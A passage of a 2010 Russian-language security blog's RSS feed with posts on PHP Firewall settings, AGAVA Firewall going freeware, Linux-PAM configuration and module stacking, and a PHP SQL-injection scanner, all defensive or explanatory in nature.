+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_UNION_SQL'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// защита от sql-инъекций</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_CLICK_ATTACK'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// включает защиту файлов</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_XSS_ATTACK'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// защита от XSS</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_COOKIES'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// защита cookies</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_POST'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// защита POST vars</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_GET'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>  <span style="color: #666666; font-style: italic;">// защита GET vars</span></pre></div></div>
+
+<p style="text-align: justify;">PHP Firewall, небольшой примечательный скрипт, имеющий массу достоинств, осталось только проверить недостатки. :]</p>
+<p style="text-align: justify;"><div id="stb-container" class="stb-container"><div id='caption' class='stb-download-caption_box' >Скачать PHP Firewall:</div><div id='body' class='stb-download-body_box' ></p>
+<p style="text-align: justify;"><strong><a title="PHP Firewall" href="http://securos.org.ua/wp-content/uploads/2010/06/PHP_Firewall_102.zip" target="_blank">PHP_Firewall_102.zip</a> </strong></p>
+<p style="text-align: justify;"><a href="http://www.php-firewall.info/" target="_blank">сайт разработчика</a></div></div></p>
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/wziq2S2mq4_3irYeptCjnOe4s1w/0/da"><img src="http://feedads.g.doubleclick.net/~a/wziq2S2mq4_3irYeptCjnOe4s1w/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/wziq2S2mq4_3irYeptCjnOe4s1w/1/da"><img src="http://feedads.g.doubleclick.net/~a/wziq2S2mq4_3irYeptCjnOe4s1w/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=CAxzGhyB8aA:4ll-fBP4Gqs:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/CAxzGhyB8aA" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>11</slash:comments>
+    </item>
+    <item>
+      <title>AGAVA Firewall теперь доступен для всех</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/d_BC0fseK8w/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/agava-firewall-teper-dostupen-dlya-vsex/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/agava-firewall-teper-dostupen-dlya-vsex/</feedburner:origLink>
+      <description>Чисто случайно сегодня набрел на информацию, что компания Agava закрыла партнерскую программы AGAVA Spamprotexx и AGAVA Firewall, объявив данное ПО как freeware. И в связи с этим я просто не могу поделится со Всеми этой новостью. И сразу давайте вместе посмотрим возможности фаервола со слов разработчика:
+
+Начинает работать сразу после инсталляции, защищая компьютер от сетевых угроз. [...]</description>
+      <category>Обзоры ПО</category>
+      <pubDate>Fri, 02 Jul 2010 20:20:07 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1765</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-07-02T20:20:07Z</dc:date>
+      <content:encoded><![CDATA[<p style="text-align: center;"><img class="size-full wp-image-1772 aligncenter" title="agava_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/07/agava_securos.org_.ua_.gif" alt="agava securos.org .ua  AGAVA Firewall теперь доступен для всех" width="223" height="72" /></p>
+<p style="text-align: justify;">Чисто случайно сегодня набрел на информацию, что компания Agava закрыла партнерскую программы AGAVA Spamprotexx и AGAVA Firewall, объявив данное ПО как freeware. И в связи с этим я просто не могу поделится со Всеми этой новостью. И сразу давайте вместе посмотрим возможности фаервола со слов разработчика:</p>
+<ul style="text-align: justify;">
+<li>Начинает работать сразу после инсталляции, защищая компьютер от сетевых угроз. Встроенный &#8220;Мастер конфигурации&#8221; поможет правильно настроить сетевую защиту даже неопытному пользователю.</li>
+<li>Показывает список всех установленных сетевых соединений.</li>
+<li>Позволяет настраивать права доступа к сети для приложений и системы.</li>
+<li>Права доступа можно настраивать как вручную, так и при помощи специального &#8220;Режима обучения&#8221;, отвечая на вопросы файрвола по факту возникновения определенных сетевых событий.</li>
+<li>Можно сделать компьютер невидимым через интернет.</li>
+<li>Все сетевые события записываются в журнал.</li>
+<li>Инспектор приложений отслеживает изменения модулей и позволяет отключать доступ к сети для зараженных вирусами приложений автоматически.</li>
+<li>Определяются приложения, подписанные неверными сертификатами.</li>
+<li>Профили настроек позволяют создать несколько различных вариантов настроек для разных пользователей или режимов работы.</li>
+<li>Есть возможность защитить доступ к настройкам файрвола паролем.</li>
+<li>При возникновении опасных ситуаций, например, атаки или замеченной вирусной активности, можно выключить сеть нажатием одной кнопки.</li>
+<li>Ведется статистика сетевой активности, которая отображается, в частности, в графическом виде.</li>
+<li>&#8220;Детектор атак&#8221; позволяет автоматически предотвращать попытки взлома системы и проникновения вирусов. Так же определяются и пресекаются случаи сканирования портов, DOS атак, подмены записей ARP таблицы. Дополнительно осуществляется stateful фильтрация, защищающая TCP стек.</li>
+<li>&#8220;Фильтр WWW&#8221; дает возможность фильтровать содержимое страниц, скачиваемых через интернет. При помощи этой подсистемы экономится трафик и ускоряется открытие страниц в браузере. Фильтр рекламных изображений (баннеров) позволяет удалять со страниц нежелательную графическую рекламу по URL и размеру изображения. Можно отключать скачивание Flash-роликов, блокировать всплывающие окна, блокировать выполнение скриптов на страницах полностью и отдельно по закрытию страницы.</li>
+<li>&#8220;Фильтр e-mail&#8221; предотвращает возможность нечаянного заражения компьютера после открытия в почтовом клиенте опасного вложения. Вложенные файлы, принадлежащие к списку опасных типов (например исполняемые, предоставляющие возможность исполнения скриптов и т.п.), переименовываются. Таким образом их нельзя запустить, не переименовав обратно, и исключается возможность нечаянного запуска.</li>
+<li>&#8220;Кэш DNS&#8221; хранит список DNS записей для определенного количества доменов и позволяет сократить время, необходимое для установления сетевых соединений.</li>
+</ul>
+<p style="text-align: justify;">Неудобство в том, что файрвол не работает с серверными операционными системами. В принципе, довольно обширный спектр услуг, распространенный для многих представителей ПО этого направления, пара своих фишек и не плохой удобный интерфейс для меня делают его привлекательным, учитывая что раньше он стоил денег (хоть и не больших &#8211; 730 руб.), входя в пакет программ &#8220;Безопасный интернет&#8221;.</p>
+<p style="text-align: center;"><a href="http://securos.org.ua/wp-content/uploads/2010/07/agava_firewall_securos.org_.ua_.gif"><img class="size-full wp-image-1766 aligncenter" title="agava_firewall_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/07/agava_firewall_securos.org_.ua_.gif" alt="agava firewall securos.org .ua  AGAVA Firewall теперь доступен для всех" width="441" height="297" /></a></p>
+<p style="text-align: justify;">Осталось только протестировать софтинку в работе, например с сервисом <a href="http://www.pcflank.com/" target="_blank">PC Flank</a>, который я описывал на блоге хорошего человека Тодосийчука Александра об интернет сервисах и  проектах &#8211; &#8220;<a href="http://www.web2me.ru/service/security/pcflanc/" target="_blank">Вебдванольные заметки</a>&#8220;. Скачать фаервол можно <a title="firewall" href="http://securos.org.ua/skachat-firewall/" target="_blank">тут</a>.</p>
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/sar0kpKAHoX7CO-SKTURusURIjQ/0/da"><img src="http://feedads.g.doubleclick.net/~a/sar0kpKAHoX7CO-SKTURusURIjQ/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/sar0kpKAHoX7CO-SKTURusURIjQ/1/da"><img src="http://feedads.g.doubleclick.net/~a/sar0kpKAHoX7CO-SKTURusURIjQ/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=d_BC0fseK8w:7zltr3lTSdU:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/d_BC0fseK8w" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>15</slash:comments>
+    </item>
+    <item>
+      <title>Формат конфигурационного файла Linux-PAM</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/NzSkruWzE0Q/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/format-konfiguracionnogo-fajla-linux-pam/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/format-konfiguracionnogo-fajla-linux-pam/</feedburner:origLink>
+      <description>Давайте рассмотрим подробнее конфигурационный файл службы подключаемых модулей аутентификации.
+Что есть конфигурационный файл? Это файл /etc/pam.conf или набор файлов в каталоге /etc/pam.d с именами, которые совпадают с именами отдельных служб.
+Оформляется как последовательность строк, каждая из которых информирует о подключении отдельного аутентификационного модуля и имеет следующий формат:
+service     module_type     control_flag     module_path   [...]</description>
+      <category>Модули аутентификации PAM</category>
+      <pubDate>Wed, 30 Jun 2010 21:04:18 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1675</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-06-30T21:04:18Z</dc:date>
+      <content:encoded><![CDATA[<p><img class="alignleft size-full wp-image-1676" title="pam.conf_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/06/pam.conf_securos.org_.ua_.png" alt="pam.conf securos.org .ua  Формат конфигурационного файла Linux PAM" width="454" height="252" /></p>
+<p>Давайте рассмотрим подробнее конфигурационный файл службы подключаемых модулей аутентификации.</p>
+<p style="text-align: justify;">Что есть конфигурационный файл? Это файл /etc/pam.conf или набор файлов в каталоге /etc/pam.d с именами, которые совпадают с именами отдельных служб.</p>
+<p style="text-align: justify;">Оформляется как последовательность строк, каждая из которых информирует о подключении отдельного аутентификационного модуля и имеет следующий формат:</p>
+<p style="text-align: justify;"><div class='stb-grey_box' >service     module_type     control_flag     module_path     options</div></p>
+<p style="text-align: justify;">Поле service определяет прикладную службу и может принимать, например,  такие значение: login, rlogin, rsh, telnet, ftp, passwd, OTHER (последнее отвечает всем тем службам, которые не указаны явным образом). Присутствует, только если в качестве конфигурационного файла используется файл /etc/pam.conf.</p>
+<p style="text-align: justify;">Поле module_type определяет тип аутентификационного модуля. Возможные значения: auth, account, session, password.</p>
+<p style="text-align: justify;">Поле control_flag определяет поведение системы в случаях, когда с одной службой связывается несколько аутентификационных модулей одного типа (когда <em>стекуется </em>несколько аутентификационных модулей). Возможные значения: requisite, required, sufficient, optional.</p>
+<p style="text-align: justify;">Поле module_path указывает на расположение аутентификационных модулей в файловой системе (содержит имена файлов с аутентификационными модулями).</p>
+<p style="text-align: justify;">Поле options содержит специфические для всех аутентификационных модулей опции (например, use_smart_card).</p>
+<p style="text-align: justify;"><div class='stb-grey-caption_box' >Пример конфигурационного файла:</div><div class='stb-grey-body_box' ></p>
+<p style="text-align: justify;">login        auth             required     pam_unix_auth.so<br />
+login        session        required     pam_unix_session.so<br />
+login        account       required     pam_unix_account.so<br />
+ftp             auth              required     pam_skey_auth.so<br />
+ftp             session         required     pam_unix_session.so<br />
+passwd    password    required     pam_unix_passwd.so<br />
+OTHER     auth             required     pam_unix_auth.so<br />
+OTHER     session        required     pam_unix_session.so<br />
+OTHER     account       required     pam_unix_account.so</div></p>
+<p style="text-align: justify;"><strong>При связывании нескольких аутентификационных механизмов с одной службой</strong> возникают следующие две проблемы:</p>
+<ul>
+<li style="text-align: justify;">реализация самой возможности подключать к одной службе несколько произвольных альтернативных аутентификационных механизмов одновременно (без переработки программного обеспечения этой службы);</li>
+<li>упрощение процедуры, через которую приходится проходить пользователю, когда применяется несколько аутентификационных механизмов одновременно.</li>
+</ul>
+<p style="text-align: justify;">Первая проблема в системе PAM решается путем реализации возможности динамического связывания программного обеспечения прикладных служб с несколькими произвольными аутентификационными модулями одного типа одновременно (в терминологии PAM это называется <em>стековкой</em> аутентификационных модулей). Для этого в конфигурационном файле нужно поместить несколько строк с одинаковым значением полей service и module_type. Стекуемые аутентификационные модули вызываются в той последовательности, в которой они перечислены в конфигурационном файле.</p>
+<p style="text-align: justify;"><div class='stb-grey-caption_box' >Фрагмент конфигурационного файла со стековкой аутентификационных модулей:</div><div class='stb-grey-body_box' ></p>
+<p style="text-align: justify;">login     auth     required     pam_unix_auth.so<br />
+login     auth     required     pam_kerb_auth.so     use_mapped_pass<br />
+login     auth     optional     pam_rsa_auth.so      use_first_pass<br />
+rlogin    auth     sufficient   pam_rhosts_auth.so<br />
+rlogin    auth     required     pam_unix_auth.so</div></p>
+<p style="text-align: justify;"><div id="stb-container" class="stb-container"><div id='caption' class='stb-info-caption_box' >ПРИМЕЧАНИЕ:</div><div id='body' class='stb-info-body_box' > Модуль pam_rhosts_auth.so реализует ту часть стандартного поведения rlogin-сервера, согласно которой пароль не спрашивается, если клиентский узел обозначен в файлах /etc/hosts.equiv или ~/.rhosts.</div></div></p>
+<p style="text-align: justify;">Поле control_flag определяет поведение системы в зависимости от результата выполнение соответствующего аутентификационного модуля.</p>
+<p style="text-align: justify;">На практике применяется, главным образом, стековка модулей аутентификации. Дальше рассмотрим семантику значений поля control_flag<em> </em>по отношению к модулям аутентификации:</p>
+<p style="text-align: justify;"><div class='stb-grey_box' ></p>
+<ul>
+<li style="text-align: justify;"><strong>requisite</strong>: как только соответствующий модуль возвратит ошибку, принимается решение о неуспехе аутентификации, при этом остальные стекуемые модули уже не выполняются;</li>
+<li><strong>required</strong>: если соответствующий модуль возвратит ошибку, принимается решение о неуспехе аутентификации, но при этом остальные стекуемые модули тоже выполняются;</li>
+<li><strong>sufficient</strong>: если соответствующий модуль будет выполнен успешно, принимается решение об успехе аутентификации, при этом остальные стекуемые модули уже не выполняются (но только если все предыдущие модули, помеченные как <em>required</em>, тоже выполнены успешно);</li>
+<li><strong>optional</strong>: успех и ошибка соответствующего модуля имеют значение, только если это единый модуль, подключенный к данной службе (в других случаях неуспех выполнения такого модуля не считается основанием для отказа в аутентификации).</div></li>
+</ul>
+<p style="text-align: justify;">Применение нескольких аутентификационных механизмов одновременно может требовать от пользователей запоминания нескольких паролей. Это неудобно, однако, использование одного пароля для разных механизмов приводит к уязвимости стойкости системы аутентификации в общем, поскольку компрометация одного пароля приводила бы в таком случае к компрометации системы в целом. Кроме того, разные аутентификационные механизмы предъявляют разные требования относительно паролей (относительно длины, алфавита, интервала обновления и т.п.), что усложняет применение одного пароля для нескольких аутентификационных механизмов.</p>
+<p style="text-align: justify;">Для решения этой проблемы в системе PAM предусмотренный механизм <em><strong>маппинга паролей (password mapping)</strong></em>. Благодаря этому механизму пользователю, который реально имеет разные пароли для разных аутентификационных механизмов, достаточно помнить лишь один из своих паролей &#8211; основной (primary). Предполагается, что это наиболее стойкий из паролей пользователя. Другие – дополнительные (secondary) – пароли пользователя сохраняются в домашнем каталоге пользователя или другом защищенном месте (например, на флеш-карте пользователя) в зашифрованном виде; при этом в качестве ключа шифрования используется основной пароль пользователя.</p>
+<p style="text-align: justify;">Для поддержки возможности использовать одного пароля для нескольких аутентификационных механизмов разработчики аутентификационных модулей должны поддерживать следующие опции:</p>
+<p style="text-align: justify;"><div class='stb-grey_box' ></p>
+<ul>
+<li style="text-align: justify;"><strong>use_first_pass</strong>: использовать тот же пароль, что и первый для стекуемых аутентификационных модулей, при этом в случае неудачной аутентификации по этому паролю не спрашивать новый;</li>
+<li><strong>try_first_pass</strong>: использовать тот же пароль, что и первый для стекуемых аутентификационных модулей, при этом в случае неудачной аутентификации по этому паролю спросить новый;</li>
+<li><strong>use_mapped_pass</strong>: получить пароль с использованием механизма маппинга паролей, при этом в случае неудачной аутентификации по этому паролю не спрашивать новый;</li>
+<li><strong>try_mapped_pass</strong>: получить пароль с использованием механизма маппинга паролей, при этом в случае неудачной аутентификации по этому паролю спросить новый.</div></li>
+</ul>
+<p style="text-align: justify;">Механизм маппинга паролей не может быть применен для аутентификационных модулей, которые предусматривают использование одноразовых паролей.</p>
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/XZZjAD7Wb1DYb2tf0hLnVNDB6zo/0/da"><img src="http://feedads.g.doubleclick.net/~a/XZZjAD7Wb1DYb2tf0hLnVNDB6zo/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/XZZjAD7Wb1DYb2tf0hLnVNDB6zo/1/da"><img src="http://feedads.g.doubleclick.net/~a/XZZjAD7Wb1DYb2tf0hLnVNDB6zo/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=NzSkruWzE0Q:cY05uHTAJQw:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/NzSkruWzE0Q" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>1</slash:comments>
+    </item>
+    <item>
+      <title>Сканер SQL-Injection на PHP</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/w3aH1dPC_-k/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/skaner-sql-injection-na-php/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/skaner-sql-injection-na-php/</feedburner:origLink>
+      <description>Данный Injection Scanner &amp;#8211; это PHP-сценарий, который анализирует строки запроса в URL. Сравнивая строку запроса с известной инъекцией, удаляет лишний код, нейтрализуя попытку взлома, по утверждению автора достаточно эффективно справляется со своей задачей. Алгоритм работы таков &amp;#8211; когда сплоит обнаружен, сценарий останавливает все PHP процессы, обрабатывающие запросы к базе данных и информирует посетителя про обнаружение. [...]</description>
+      <category>Безопасность скриптов</category>
+      <pubDate>Tue, 29 Jun 2010 13:39:35 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1701</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-06-29T13:39:35Z</dc:date>
+      <content:encoded><![CDATA[<p style="text-align: center;"><img class="size-full wp-image-1706 aligncenter" title="sql_injection_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/06/sql_injection_securos.org_.ua_.jpg" alt="sql injection securos.org .ua  Сканер SQL Injection на PHP" width="440" height="340" /></p>
+<p style="text-align: justify;">Данный Injection Scanner &#8211; это PHP-сценарий, который анализирует строки запроса в URL. Сравнивая строку запроса с известной инъекцией, удаляет лишний код, нейтрализуя попытку взлома, по утверждению автора достаточно эффективно справляется со своей задачей. Алгоритм работы таков &#8211; когда сплоит обнаружен, сценарий останавливает все PHP процессы, обрабатывающие запросы к базе данных и информирует посетителя про обнаружение. IP адреса, связанные с инъекциями, могут быть запрещены для страниц, на которых включен скрипт, но при наличии прокси и генерации псевдо-IP-адресов, по моему данная функция не оправдывает себя.</p>
+<p style="text-align: justify;"><div class='stb-grey-caption_box' >Способ подключения:</div><div class='stb-grey-body_box' ></p>
+
+<div class="wp_syntax"><div class="code"><pre class="php" style="font-family:monospace;"><span style="color: #339933;">&#60;</span>html<span style="color: #339933;">&#62;</span>
+<span style="color: #339933;">&#60;</span>head<span style="color: #339933;">&#62;</span>
+<span style="color: #339933;">&#60;</span>title<span style="color: #339933;">&#62;</span> Тест <span style="color: #339933;">&#60;/</span>title<span style="color: #339933;">&#62;</span>
+<span style="color: #339933;">&#60;/</span>head<span style="color: #339933;">&#62;</span>
+<span style="color: #339933;">&#60;</span>body<span style="color: #339933;">&#62;</span>
+<span style="color: #339933;">&#60;</span> ? php <span style="color: #b1b100;">include</span> <span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'/absolute/path/to/scan.php '</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">?&#62;</span>
+<span style="color: #339933;">&#60;</span> ? php 
+<span style="color: #b1b100;">echo</span> <span style="color: #0000ff;">&#34;Бла-бла-бла!&#34;</span><span style="color: #339933;">;</span> 
+<span style="color: #000000; font-weight: bold;">?&#62;</span>
+<span style="color: #339933;">&#60;/</span>body<span style="color: #339933;">&#62;</span>
+<span style="color: #339933;">&#60;/</span>html<span style="color: #339933;">&#62;</span></pre></div></div>
+
+<p></div></p>
+<p style="text-align: justify;">Там где /absolute/path/to/scan.php прописывайте свой путь к файлу scan.php. Обратите, также внимание на версию php, нужна на меньше 5, желательно 5.2.5. Методом эксперимента можно потестить и на других. В целом не плохой метод борьбы со взломами.</p>
+<p style="text-align: justify;"><div id="stb-container" class="stb-container"><div id='caption' class='stb-download-caption_box' >Скачать myPHPscripts Injection Scanner:</div><div id='body' class='stb-download-body_box' ></p>
+<p style="text-align: justify;"><a title="сканер SQL-инъекций на PHP" href="http://securos.org.ua/wp-content/uploads/2010/06/injection_scanner.zip" target="_blank"><strong>injection_scanner.zip</strong></a></div></div></p>
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/f5h9LqhbeeeqFCM2dH11gfwkY_o/0/da"><img src="http://feedads.g.doubleclick.net/~a/f5h9LqhbeeeqFCM2dH11gfwkY_o/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/f5h9LqhbeeeqFCM2dH11gfwkY_o/1/da"><img src="http://feedads.g.doubleclick.net/~a/f5h9LqhbeeeqFCM2dH11gfwkY_o/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=w3aH1dPC_-k:uQ1x_hyBP3Y:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/w3aH1dPC_-k" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>5</slash:comments>
+    </item>
+    <item>
+      <title>Назначение, принципы функционирования системы PAM</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/hnoyhXLlp-Y/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/naznachenie-principy-funkcionirovaniya-sistemy-pam/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/naznachenie-principy-funkcionirovaniya-sistemy-pam/</feedburner:origLink>
+      <description>Подключаемые модули аутентификации (PAM &amp;#8211; Pluggable Authentication Modules) не защищают систему от атаки, но с их помощью можно это дело предотвратить. В этом ознакомительном посте предлагаю рассмотреть общие понятия, касательно PAM и таким образом положить начало циклу нескольких постов на эту тему.
+Назначение системы PAM:
+
+обеспечить возможность свободно выбирать механизм аутентификации по замалчиванию;
+обеспечить возможность применять для разных [...]</description>
+      <category>Модули аутентификации PAM</category>
+      <pubDate>Thu, 24 Jun 2010 21:00:45 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1666</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-06-24T21:00:45Z</dc:date>
+      <content:encoded><![CDATA[<p style="text-align: center;"><img class="size-full wp-image-1668 aligncenter" title="pam_1_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/06/pam_1_securos.org_.ua_.png" alt="pam 1 securos.org .ua  Назначение, принципы функционирования системы PAM" width="437" height="263" /></p>
+<p style="text-align: justify;">Подключаемые модули аутентификации (PAM &#8211; Pluggable Authentication Modules) не защищают систему от атаки, но с их помощью можно это дело предотвратить. В этом ознакомительном посте предлагаю рассмотреть общие понятия, касательно PAM и таким образом положить начало циклу нескольких постов на эту тему.</p>
+<p style="text-align: justify;"><div class='stb-grey-caption_box' >Назначение системы PAM:</div><div class='stb-grey-body_box' ></p>
+<ol style="text-align: justify;">
+<li style="text-align: justify;">обеспечить возможность свободно выбирать механизм аутентификации по замалчиванию;</li>
+<li>обеспечить возможность применять для разных прикладных служб разные механизмы аутентификации;</li>
+<li>обеспечить возможность разрабатывать прикладные службы и механизмы аутентификации независимо.</div></li>
+</ol>
+<p style="text-align: justify;">Функционирование системы PAM базируется на возможности динамично подключать к программному обеспечению прикладных служб программные модули, которые реализуют те или иные механизмы аутентификации.</p>
+<p style="text-align: justify;"><div class='stb-grey-caption_box' >Основные компоненты системы PAM:</div><div class='stb-grey-body_box' ></p>
+<ol style="text-align: justify;">
+<li style="text-align: justify;">библиотека обобщенных функций аутентификации (PAM library);</li>
+<li>набор специфических для того или иного механизма аутентификации модулей аутентификации.</div></li>
+</ol>
+<p style="text-align: justify;">Первый обеспечивает создание для прикладных служб обобщенного интерфейса доступа к модулям аутентификации, подгружая по необходимости нужные модули (в соответствии с содержанием конфигурационного файла). Вторые обеспечивают реализацию отдельных механизмов аутентификации.</p>
+<p style="text-align: justify;">Кроме модулей, которые реализуют функции только аутентификации, предполагается наличие модулей, предназначенных для выполнения других, связанных с аутентификацией, задач, таких как управление пользовательскими сеансами (session management), учетными записями (account management) и паролями (password management).</p>
+<p style="text-align: justify;">Таким образом, предусмотрено использование <strong>четырех видов аутентификационных модулей</strong>:</p>
+<ul style="text-align: justify;">
+<li style="text-align: justify;"><strong><em>модули аутентификации</em></strong> (разрешают выполнить аутентификацию субъекта доступа к ресурсам с использованием того или иного механизма аутентификации);</li>
+<li><strong><em>модули управления учетными записями</em> </strong>(разрешают проверить, возможен ли данному субъекту доступ в нужный момент согласно его учетной записи (не является ли его учетная запись заблокированной по той или иной причине, разрешается ли ему работать в данное время));</li>
+<li><strong><em>модули управления сеансами</em></strong> (разрешают выполнять разные действия в начале и в конце пользовательских сеансов, например, зарегистрировать время их начала и/или продолжительность с использованием одного из механизмов регистрации);</li>
+<li style="text-align: justify;"><strong><em>модули управления паролями</em></strong> (разрешают изменять пароли).</li>
+</ul>
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
